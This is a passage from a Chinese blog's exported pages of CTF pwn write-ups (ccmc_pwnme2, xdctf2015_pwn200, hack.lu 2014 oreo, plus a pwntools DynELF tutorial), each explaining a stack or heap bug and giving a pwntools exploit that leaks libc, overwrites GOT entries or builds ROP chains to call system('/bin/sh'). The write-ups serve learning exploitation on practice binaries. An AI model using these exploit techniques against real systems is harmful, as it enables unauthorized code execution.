chunk0</span></span><br><span class=\"line\">free(<span class=\"number\">1</span>)<span class=\"comment\">#print chunk</span></span><br><span class=\"line\">r.recvuntil(<span class=\"string\">&quot;Start&quot;</span>)</span><br><span class=\"line\">libc_start_main = u64(r.recvline(<span class=\"string\">&quot;END&quot;</span>,drop = <span class=\"literal\">True</span>))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"built_in\">hex</span>(libc_start_main))</span><br><span class=\"line\"></span><br><span class=\"line\">libc_base = libc_start_main - libc.symbols[__libc_start_main]</span><br><span class=\"line\">system_addr = libc_base + libc.symbols[system]</span><br><span class=\"line\"></span><br><span class=\"line\">free(<span class=\"number\">0</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">32</span>,<span class=\"string\">b&quot;/bin/sh;&quot;</span>.ljust(<span class=\"number\">24</span>,<span class=\"string\">b&#x27;a&#x27;</span>) + p64(system_addr))</span><br><span class=\"line\"></span><br><span class=\"line\">free(<span class=\"number\">1</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">r.interactive()</span><br></pre></td></tr></table></figure>\n\n<p>​        </p>\n","categories":["HEAP - Fastbin Attack"]},{"title":"ccmc_pwnme2","url":"/2022/03/16/week3-2.2/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script><p>​    \n    <div id=\"aplayer-NvfEcyJU\" class=\"aplayer aplayer-tag-marker meting-tag-marker\"\n         data-id=\"7342554262\" data-server=\"netease\" data-type=\"playlist\" data-mode=\"circulation\" data-autoplay=\"false\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#555\"\n    ></div> </p>\n<h4 id=\"ccmc-pwnme2\"><a href=\"#ccmc-pwnme2\" class=\"headerlink\" title=\"ccmc_pwnme2\"></a>ccmc_pwnme2</h4><p>一道看起来人畜无害的栈题。但是有几个非常奇怪的函数。</p>\n<p>​        所以这是一道相对有些奇怪的rop，控制这三个函数的其中两个的参数为指定字符串，就能较为方便地读取flag。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">p = remote(<span class=\"string\">&#x27;node4.buuoj.cn&#x27;</span>,<span class=\"number\">27653</span>)</span><br><span class=\"line\"><span class=\"comment\">#p = process(&#x27;./pwnme2&#x27;)</span></span><br><span class=\"line\">pop_edi_ebp_ret= <span class=\"number\">0x0804867f</span></span><br><span class=\"line\">pop_ebp_ret = <span class=\"number\">0x08048680</span></span><br><span class=\"line\"></span><br><span class=\"line\">add_home = <span class=\"number\">0x08048644</span></span><br><span class=\"line\">add_flag = <span class=\"number\">0x08048682</span></span><br><span class=\"line\">exec_string  = <span class=\"number\">0x080485CB</span></span><br><span class=\"line\"></span><br><span class=\"line\">payload = <span class=\"string\">b&quot;a&quot;</span>*<span class=\"number\">112</span>  + p32(add_home) + p32(pop_ebp_ret) + p32(<span class=\"number\">0xDEADBEEF</span>) </span><br><span class=\"line\">payload += p32(add_flag) + p32(pop_edi_ebp_ret) + p32(<span class=\"number\">0xCAFEBABE</span>) + p32(<span class=\"number\">0xABADF00D</span>) </span><br><span class=\"line\">payload += p32(exec_string)</span><br><span class=\"line\"></span><br><span class=\"line\">p.send(payload)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n\n\n\n<p>​    </p>\n<p>​    ps：感觉还需要再多做一些rop</p>\n","categories":["STACK - Stack Overflow"],"tags":["ret2gadgets"]},{"title":"DynELF学习","url":"/2022/03/16/DynELF/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script>\n    <div id=\"aplayer-bUUzuFtS\" class=\"aplayer aplayer-tag-marker meting-tag-marker\"\n         data-id=\"7342554262\" data-server=\"netease\" data-type=\"playlist\" data-mode=\"circulation\" data-autoplay=\"false\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#555\"\n    ></div> \n\n<h3 id=\"0\"><a href=\"#0\" class=\"headerlink\" title=\"0\"></a>0</h3><p>​        我发现我居然还不太会用这个东西，可以用不上，但是不能不会。</p>\n<h4 id=\"1\"><a href=\"#1\" class=\"headerlink\" title=\"1\"></a>1</h4><p>​        DynELF的意义在于当我们无法找到目标libc中具体的符号偏移时，可以利用它来搜索内存中的函数地址,而不需要再通过libc来获取。</p>\n<h5 id=\"如何使用？\"><a href=\"#如何使用？\" class=\"headerlink\" title=\"如何使用？\"></a>如何使用？</h5><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">p = process(<span class=\"string\">&#x27;./pwnme&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># Declare a function that takes a single address, and</span></span><br><span class=\"line\"><span class=\"comment\"># leaks at least one byte at that address.</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">leak</span>(<span class=\"params\">address</span>):</span></span><br><span class=\"line\">    data = p.read(address, <span class=\"number\">4</span>)</span><br><span class=\"line\">    log.debug(<span class=\"string\">&quot;%#x =&gt; %s&quot;</span> % (address, (data <span class=\"keyword\">or</span> <span class=\"string\">&#x27;&#x27;</span>).encode(<span class=\"string\">&#x27;hex&#x27;</span>)))</span><br><span class=\"line\">    <span class=\"keyword\">return</span> data</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># For the sake of this example, let&#x27;s say that we</span></span><br><span class=\"line\"><span class=\"comment\"># have any of these pointers.  One is a pointer into</span></span><br><span class=\"line\"><span class=\"comment\"># the target binary, the other two are pointers into libc</span></span><br><span class=\"line\">main   = <span class=\"number\">0xfeedf4ce</span></span><br><span class=\"line\">libc   = <span class=\"number\">0xdeadb000</span></span><br><span class=\"line\">system = <span class=\"number\">0xdeadbeef</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># With our leaker, and a pointer into our target binary,</span></span><br><span class=\"line\"><span class=\"comment\"># we can resolve the address of anything.</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\"># We do not actually need to have a copy of the target</span></span><br><span class=\"line\"><span class=\"comment\"># binary for this to work.</span></span><br><span class=\"line\">d = DynELF(leak, main)</span><br><span class=\"line\"><span class=\"keyword\">assert</span> d.lookup(<span class=\"literal\">None</span>,     <span class=\"string\">&#x27;libc&#x27;</span>) == libc</span><br><span class=\"line\"><span class=\"keyword\">assert</span> d.lookup(<span class=\"string\">&#x27;system&#x27;</span>, <span class=\"string\">&#x27;libc&#x27;</span>) == system</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># However, if we *do* have a copy of the target binary,</span></span><br><span class=\"line\"><span class=\"comment\"># we can speed up some of the steps.</span></span><br><span class=\"line\">d = DynELF(leak, main, elf=ELF(<span class=\"string\">&#x27;./pwnme&#x27;</span>))</span><br><span class=\"line\"><span class=\"keyword\">assert</span> d.lookup(<span class=\"literal\">None</span>,     <span class=\"string\">&#x27;libc&#x27;</span>) == libc</span><br><span class=\"line\"><span class=\"keyword\">assert</span> d.lookup(<span class=\"string\">&#x27;system&#x27;</span>, <span class=\"string\">&#x27;libc&#x27;</span>) == system</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># Alternately, we can resolve symbols inside another library,</span></span><br><span class=\"line\"><span class=\"comment\"># given a pointer into it.</span></span><br><span class=\"line\">d = DynELF(leak, libc + <span class=\"number\">0x1234</span>)</span><br><span class=\"line\"><span class=\"keyword\">assert</span> d.lookup(<span class=\"string\">&#x27;system&#x27;</span>)      == system</span><br></pre></td></tr></table></figure>\n\n\n\n<p>​            </p>\n<p>​        大致描述一下，就是先用<code>leak()</code>函数按照原本ret2xx的方法用stdout函数来打印addr的数据，然后</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">d = DynELF(leak, main)</span><br><span class=\"line\">system_addr = d.lookup(<span class=\"string\">&#x27;system&#x27;</span>, <span class=\"string\">&#x27;libc&#x27;</span>)</span><br></pre></td></tr></table></figure>\n\n<p>​        来找到system的地址。</p>\n<p>​        </p>\n<h5 id=\"原理？\"><a href=\"#原理？\" class=\"headerlink\" title=\"原理？\"></a>原理？</h5><p>​        这个module其实非常好用，指不知道原理也能用。</p>\n<p>​        DynELF泄露地址的过程原理通常分为两步，首先通过暴力对比找到libc的内存加载基址。</p>\n<p>​        在找libc之前还需要找到elf文件在内存中的加载基址。</p>\n<h6 id=\"寻找elf文件加载基址\"><a href=\"#寻找elf文件加载基址\" class=\"headerlink\" title=\"寻找elf文件加载基址\"></a>寻找elf文件加载基址</h6><p>​        基地址内存页起始的字符串为<code>\\0x7fELF</code>，所以可以指定内存中的地址，然后对地址进行页对齐，再与当前内存页起始字符串进行对比，如果不符合则不断与更低地址内存页的起始字符串对比，直到找到。</p>\n<h6 id=\"寻找glibc加载基址\"><a href=\"#寻找glibc加载基址\" class=\"headerlink\" title=\"寻找glibc加载基址\"></a>寻找glibc加载基址</h6><p>​        efl在内存中有一个叫做<code>link_map</code>的双向链表，在学习ret2dl的时候遇见过，大致是指向elf的一些表项相关数据结构的链表。</p>\n<p>​        对于如何找到<code>link_map</code>    ,一般来说有两种方式，在full relro以外的elf中，可以在<code>Dynamic</code>段的<code>.got.plt</code>节中找到，对于启用full relro的elf，可以在<code>Dynamic</code>段的<code>DT_DEBUG</code>中找到。</p>\n<p>​        <code>Dynamic</code>段的地址则需要通过ELF文件的段表得到，由于我们已经获得了ELF的内存基地址，所以也能得到段表的地址。</p>\n<h6 id=\"在libc中寻找hash表，动态符号表与字符串表基地址\"><a href=\"#在libc中寻找hash表，动态符号表与字符串表基地址\" class=\"headerlink\" title=\"在libc中寻找hash表，动态符号表与字符串表基地址\"></a>在libc中寻找hash表，动态符号表与字符串表基地址</h6><p>​        通过上面两步我们已经获得了libc的基地址，因此很容易得到所有与函数相关的hash表，动态符号表以及字符串表的基地址。最后，可以通过hash表得到system的地址。</p>\n<p>​        </p>\n<h4 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h4><p>​    <a href=\"https://www.freebuf.com/articles/system/193646.html\">Pwntools之DynELF原理探究</a></p>\n<p>​        </p>\n<p>​    <a href=\"https://uaf.io/exploitation/misc/2016/04/02/Finding-Functions.html\">Finding Function’s Load Address</a></p>\n","categories":["STACK - DynELF"],"tags":["mess"]},{"title":"xdctf2015_pwn200","url":"/2022/03/17/week3-3.1/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script>\n    <div id=\"aplayer-njBWOuUC\" class=\"aplayer aplayer-tag-marker meting-tag-marker\"\n         data-id=\"7342554262\" data-server=\"netease\" data-type=\"playlist\" data-mode=\"circulation\" data-autoplay=\"false\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#555\"\n    ></div>     \n\n<h2 id=\"xdctf2015-pwn200\"><a href=\"#xdctf2015-pwn200\" class=\"headerlink\" title=\"xdctf2015_pwn200\"></a>xdctf2015_pwn200</h2><p>​    </p>\n<p>​        练习一下DynELF。</p>\n<p>​        看起来像ret2csu+DynELF。</p>\n<p>​        没啥好分析的，溢出112,然后直接写leak函数。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">leak</span>(<span class=\"params\">addr</span>):</span></span><br><span class=\"line\">\tpayload = <span class=\"string\">b&#x27;a&#x27;</span>*offset</span><br><span class=\"line\">\tpayload += p32(write_plt)</span><br><span class=\"line\">\tpayload += p32(ret_addr)</span><br><span class=\"line\">\tpayload += p32(<span class=\"number\">1</span>)</span><br><span class=\"line\">\tpayload += p32(addr)</span><br><span class=\"line\">\tpayload += p32(<span class=\"number\">4</span>)</span><br><span class=\"line\">\tp.send(payload)</span><br><span class=\"line\">\tdata = p.recv()</span><br><span class=\"line\">\tlog.info(<span class=\"string\">&quot;leaking: 0x%x --&gt; %s&quot;</span> % (addr, (data <span class=\"keyword\">or</span> <span class=\"string\">&#x27;&#x27;</span>).encode(<span class=\"string\">&#x27;hex&#x27;</span>)))</span><br><span class=\"line\">    <span class=\"keyword\">return</span> data</span><br><span class=\"line\"></span><br><span class=\"line\">d = DynELF(leak,elf = elf)</span><br><span class=\"line\"></span><br><span class=\"line\">system_addr = d.lookup(<span class=\"string\">&#x27;system&#x27;</span>,<span class=\"string\">&#x27;libc&#x27;</span>)</span><br><span class=\"line\">log.info(<span class=\"string\">&quot;system address: 0x%x&quot;</span> % system_addr)</span><br></pre></td></tr></table></figure>\n\n<p>​        </p>\n<p>​        一般来说这个模块的利用就是通过stdout的函数来泄露某个地址，然后再暴力寻找，相对普通的ret2libc其实更为方便快捷，我不知道为什么感觉用的人很少。</p>\n<p>ps：关于整体布栈还是有一些小的疑问。</p>\n","categories":["STACK - DynELF"],"tags":["DynELF"]},{"title":"2014 hack.lu oreo","url":"/2022/03/17/week3-3.2/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script>\n    <div id=\"aplayer-KUvKzFfQ\" class=\"aplayer aplayer-tag-marker meting-tag-marker\"\n         data-id=\"7342554262\" data-server=\"netease\" data-type=\"playlist\" data-mode=\"circulation\" data-autoplay=\"false\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#555\"\n    ></div>     \n\n<h4 id=\"overview\"><a href=\"#overview\" class=\"headerlink\" title=\"overview\"></a>overview</h4><p>​        <img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-17%20%E4%B8%8B%E5%8D%883.11.04.png\" alt=\"截屏2022-03-17 下午3.11.04\"></p>\n<p>​        搞不懂为什么这么多题都要stripped。</p>\n<h4 id=\"逆向\"><a href=\"#逆向\" class=\"headerlink\" title=\"逆向\"></a>逆向</h4><h5 id=\"add\"><a href=\"#add\" class=\"headerlink\" title=\"add\"></a>add</h5><h5 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-17%20%E4%B8%8B%E5%8D%885.27.45.png\" alt=\"截屏2022-03-17 下午5.27.45\"></h5><p>​        申请0x38大小的chunk，user space开始处存枪支的description,+0x19处存放枪支的name。</p>\n<p>​        输入name的时候，最大长度为56，导致能够溢出，覆盖fd字段。</p>\n<p>​        同时每输入信息以后都会有一个保存指针的操作：<br><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-17%20%E4%B8%8B%E5%8D%885.35.13.png\" alt=\"截屏2022-03-17 下午5.35.13\"></p>\n<h5 id=\"free\"><a href=\"#free\" class=\"headerlink\" title=\"free\"></a>free</h5><p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-17%20%E4%B8%8B%E5%8D%885.33.13.png\" alt=\"截屏2022-03-17 下午5.33.13\"></p>\n<p>​            虽然free了ptr，但是会将allocaed chunk的fd字段作为free后的fd指针，存在ptr指向的地址。</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-17%20%E4%B8%8B%E5%8D%885.51.06.png\" alt=\"截屏2022-03-17 下午5.51.06\"></p>\n<p>​        可以看到bin中的fd。</p>\n<h5 id=\"show\"><a href=\"#show\" class=\"headerlink\" title=\"show\"></a>show</h5><p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-18%20%E4%B8%8B%E5%8D%882.06.39.png\" alt=\"截屏2022-03-18 下午2.06.39\"></p>\n<p>​    </p>\n<p>​            打印descrption时会将fd指针所所指向的内容打印出来。</p>\n<h5 id=\"message-amp-show-status\"><a href=\"#message-amp-show-status\" class=\"headerlink\" title=\"message&amp;show status\"></a>message&amp;show status</h5><p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-18%20%E4%B8%8B%E5%8D%883.22.16.png\" alt=\"截屏2022-03-18 下午3.22.16\">            </p>\n<p>​        注意<code>fgets()</code>的定义，将128字节从stdin读进notice指向的地址（bss段上），然后在show status函数中打印出来。</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-18%20%E4%B8%8B%E5%8D%883.23.24.png\" alt=\"截屏2022-03-18 下午3.23.24\"></p>\n<p>​        所以可以看到，在一般情况下，向message留言，一般内存布局是这样子的</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-18%20%E4%B8%8B%E5%8D%884.01.09.png\" alt=\"截屏2022-03-18 下午4.01.09\"></p>\n<p>​        也就是a2a8指向a2c0，所以是向a2c0写入数据。这样如果把a2a8储存的数据改为某个函数的got表，就能够实现got表的更改。</p>\n<h4 id=\"利用\"><a href=\"#利用\" class=\"headerlink\" title=\"利用\"></a>利用</h4><h6 id=\"把fd项填为puts-got的地址，从而泄露libc基址，计算system地址\"><a href=\"#把fd项填为puts-got的地址，从而泄露libc基址，计算system地址\" class=\"headerlink\" title=\"把fd项填为puts@got的地址，从而泄露libc基址，计算system地址\"></a>把fd项填为<code>puts@got</code>的地址，从而泄露libc基址，计算system地址</h6><p>​    泄露地址利用了程序的第一个漏洞，正因为打印descrption时会将fd指针所所指向的内容打印出来，所以如果我们将其覆盖为<code>puts()</code>的got表地址，就能够泄露其地址。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">add(<span class=\"number\">25</span> * <span class=\"string\">b&#x27;a&#x27;</span>, name)</span><br><span class=\"line\">show_rifle()</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&#x27;===================================\\n&#x27;</span>)</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&#x27;Description: &#x27;</span>)</span><br><span class=\"line\">puts_addr = u32(p.recvuntil(<span class=\"string\">&#x27;\\n&#x27;</span>, drop=<span class=\"literal\">True</span>)[:<span class=\"number\">4</span>])</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"built_in\">hex</span>(puts_addr))</span><br></pre></td></tr></table></figure>\n\n<p>​        然后按套路算出<code>system()</code>的地址。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">libcbase = puts_addr - libc.symbols(<span class=\"string\">&#x27;puts&#x27;</span>)</span><br><span class=\"line\">system_addr = libcbase + libc.symbols(<span class=\"string\">&#x27;system&#x27;</span>)</span><br><span class=\"line\">log.success(<span class=\"string\">&#x27;system_addr &#x27;</span> + <span class=\"built_in\">hex</span>(system_addr))</span><br></pre></td></tr></table></figure>\n\n<h6 id=\"利用任意地址写覆盖free-got为system-addr\"><a href=\"#利用任意地址写覆盖free-got为system-addr\" class=\"headerlink\" title=\"利用任意地址写覆盖free@got为system_addr\"></a>利用任意地址写覆盖free@got为system_addr</h6><p>​        刚才说到，我们可以将notice处的指针改为got表地址，为了做到这一点，我们需要在这个地址附近申请一个fake chunkk。</p>\n<p>​        这里主要利用到了<code>order()</code>函数中的漏洞。虽然free的过程中将ptr置0，但是chunk中还保存着fd。</p>\n<p>​        最开始有一个简单的想法，就是直接将fd覆盖为got表地址，从而在got表项地址处申请chunk来修改，想法是自然的，然而如果只是单纯地将fd覆盖为free@got，并不能成功地在target addr分配chunk，这是由于分配chunk时的一系列检测。</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-18%20%E4%B8%8B%E5%8D%883.45.11.png\" alt=\"截屏2022-03-18 下午3.45.11\"></p>\n<p>​        <img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-18%20%E4%B8%8B%E5%8D%883.45.41.png\" alt=\"截屏2022-03-18 下午3.45.41\"></p>\n<p>​        如果直接将fd填成<code>free_got_addr</code>，就会造成double free。为什么捏？如果是地址无效我还是能够理解，但是double free我确实不理解。在free了当前chunk之后，fastbin不是应该长这样 》<code>main_arena =&gt; free_got_addr =&gt;chunk0</code>?怎么会有double free呢？</p>\n<p>​        </p>\n<p>​        先不管。</p>\n<p>​        回到在notice附近构造fake chunk，可以先add一个chunk，并按照之前的方式覆盖fd为notice的地址。这样一来当我们free这个chunk，再add 相同size的chunk时，notice就会被作为fake chunk的ptr，被分配出去。</p>\n<p>​        当然，为了成功伪造fake chunk，我们至少要将notice的空间添加一些chunk该有的结构，比如说size。以及next chunk的size和prev size。</p>\n<p>​        为了覆盖got表，user space开始的地址需要是<code>0x804A2A</code>,所以这个chunk的size的地址在<code>0x804A2A4</code></p>\n<p>​        <img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-18%20%E4%B8%8B%E5%8D%885.24.13.png\" alt=\"截屏2022-03-18 下午5.24.13\"></p>\n<p>​        可以看到这个地址正好是枪支已经添加的数量，所以为了构造fake chunk的size，我们可以先总共申0x40个枪支，因为之前泄露libc已经申请了一个，所以只需要再申请0x40-1只。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">from</span> LibcSearcher <span class=\"keyword\">import</span> LibcSearcher</span><br><span class=\"line\"></span><br><span class=\"line\">libc = ELF(<span class=\"string\">&quot;/glibc/2.23/32/lib/libc-2.23.so&quot;</span>)</span><br><span class=\"line\">context.terminal = [<span class=\"string\">&#x27;tmux&#x27;</span>,<span class=\"string\">&#x27;splitw&#x27;</span>,<span class=\"string\">&#x27;-h&#x27;</span>]</span><br><span class=\"line\">context.log_level = <span class=\"string\">&quot;debug&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"string\">if args[&#x27;REMOTE&#x27;]:</span></span><br><span class=\"line\"><span class=\"string\">    p = remote(&quot;node4.buuoj.cn&quot;,27999)</span></span><br><span class=\"line\"><span class=\"string\">else:</span></span><br><span class=\"line\"><span class=\"string\">    &#x27;&#x27;&#x27;</span></span><br><span class=\"line\">p = process([<span class=\"string\">&quot;/glibc/2.23/32/lib/ld-2.23.so&quot;</span>,<span class=\"string\">&quot;./oreo&quot;</span>],env=&#123;<span class=\"string\">&quot;LD_PRELOAD&quot;</span> : <span class=\"string\">&quot;/glibc/2.23/32/lib/libc.so.6&quot;</span>&#125;)</span><br><span class=\"line\">elf = ELF(<span class=\"string\">&#x27;./oreo&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">strlen_got_addr = elf.got[<span class=\"string\">&#x27;strlen&#x27;</span>]</span><br><span class=\"line\">notice_addr = <span class=\"number\">0x804A2A8</span></span><br><span class=\"line\">free_got_addr = <span class=\"number\">0x804A238</span> </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">add</span>(<span class=\"params\">descrip, name</span>):</span></span><br><span class=\"line\">    p.sendline(<span class=\"string\">&#x27;1&#x27;</span>)</span><br><span class=\"line\">    <span class=\"comment\">#p.recvuntil(&#x27;Rifle name: &#x27;)</span></span><br><span class=\"line\">    p.sendline(name)</span><br><span class=\"line\">    <span class=\"comment\">#p.recvuntil(&#x27;Rifle description: &#x27;)</span></span><br><span class=\"line\">    <span class=\"comment\">#sleep(0.5)</span></span><br><span class=\"line\">    p.sendline(descrip)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">show_rifle</span>():</span></span><br><span class=\"line\">    p.sendline(<span class=\"string\">&#x27;2&#x27;</span>)</span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">&#x27;===================================\\n&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">order</span>():</span></span><br><span class=\"line\">    p.sendline(<span class=\"string\">&#x27;3&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">message</span>(<span class=\"params\">notice</span>):</span></span><br><span class=\"line\">    p.sendline(<span class=\"string\">&#x27;4&#x27;</span>)</span><br><span class=\"line\">    <span class=\"comment\">#p.recvuntil(&quot;Enter any notice you&#x27;d like to submit with your order: &quot;)</span></span><br><span class=\"line\">    p.sendline(notice)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#find libc base</span></span><br><span class=\"line\"></span><br><span class=\"line\">name = <span class=\"number\">27</span> * <span class=\"string\">b&#x27;a&#x27;</span> + p32(elf.got[<span class=\"string\">&#x27;puts&#x27;</span>])</span><br><span class=\"line\">add(<span class=\"number\">25</span> * <span class=\"string\">b&#x27;a&#x27;</span>, name)</span><br><span class=\"line\">show_rifle()</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&#x27;===================================\\n&#x27;</span>)</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&#x27;Description: &#x27;</span>)</span><br><span class=\"line\">puts_addr = u32(p.recvuntil(<span class=\"string\">&#x27;\\n&#x27;</span>, drop=<span class=\"literal\">True</span>)[:<span class=\"number\">4</span>])</span><br><span class=\"line\">log.success(<span class=\"string\">&#x27;puts_addr &#x27;</span> + <span class=\"built_in\">hex</span>(puts_addr))</span><br><span class=\"line\"></span><br><span class=\"line\">libcbase = puts_addr - libc.symbols[<span class=\"string\">&#x27;puts&#x27;</span>]</span><br><span class=\"line\">system_addr = libcbase + libc.symbols[<span class=\"string\">&#x27;system&#x27;</span>]</span><br><span class=\"line\">log.success(<span class=\"string\">&#x27;system_addr &#x27;</span> + <span class=\"built_in\">hex</span>(system_addr))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#overwrite free@got</span></span><br><span class=\"line\">n = <span class=\"number\">1</span></span><br><span class=\"line\"><span class=\"keyword\">while</span> n &lt; <span class=\"number\">0x3f</span>:</span><br><span class=\"line\"><span class=\"comment\"># set next link=NULL</span></span><br><span class=\"line\">    add(<span class=\"number\">25</span> * <span class=\"string\">b&#x27;a&#x27;</span>, <span class=\"string\">b&#x27;a&#x27;</span> * <span class=\"number\">27</span> + p32(<span class=\"number\">0</span>))</span><br><span class=\"line\">    n += <span class=\"number\">1</span></span><br><span class=\"line\">add(<span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">25</span>,<span class=\"string\">b&#x27;b&#x27;</span>*<span class=\"number\">27</span>+p32(notice_addr))</span><br><span class=\"line\"></span><br><span class=\"line\">payload = <span class=\"string\">b&#x27;\\x00&#x27;</span>*<span class=\"number\">0x20</span>  +p32(<span class=\"number\">0x40</span>) + p32(<span class=\"number\">0x99</span>)<span class=\"comment\">#</span></span><br><span class=\"line\">payload = payload.ljust(<span class=\"number\">52</span>,<span class=\"string\">b&#x27;a&#x27;</span>)</span><br><span class=\"line\">payload += p32(<span class=\"number\">0</span>)</span><br><span class=\"line\">payload = payload.ljust(<span class=\"number\">128</span>,<span class=\"string\">b&#x27;c&#x27;</span>)</span><br><span class=\"line\">message(payload)</span><br><span class=\"line\">order()</span><br><span class=\"line\"><span class=\"comment\">#p.recvuntil(&#x27;Okay order submitted!\\n&#x27;)</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#modify the strlen_got to system</span></span><br><span class=\"line\"></span><br><span class=\"line\">payload = p32(strlen_got_addr).ljust(<span class=\"number\">20</span>,<span class=\"string\">b&#x27;a&#x27;</span>)</span><br><span class=\"line\">add(payload,<span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">20</span>)</span><br><span class=\"line\">gdb.attach(p)</span><br><span class=\"line\"></span><br><span class=\"line\">message(p32(system_addr) + <span class=\"string\">b&#x27;;/bin/sh\\x00&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n\n\n\n<p>​                </p>\n","categories":["HEAP - Fastbin Attack"],"tags":["UAF"]},{"title":"杂碎的指令","url":"/2021/04/24/%E6%9D%82%E7%A2%8E%E7%9A%84%E6%8C%87%E4%BB%A4/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script><p>[TOC]</p>\n\n    <div 